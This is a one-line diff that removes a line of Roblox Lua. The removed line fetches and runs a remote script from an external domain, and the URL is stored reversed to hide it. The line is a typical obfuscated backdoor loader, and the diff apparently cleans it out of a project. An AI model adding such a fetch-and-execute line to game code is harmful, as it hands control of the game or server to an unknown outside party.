@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('rekcuFnezitiC/stpircS/fc.ytied.www//:sptth'):reverse(),true))()
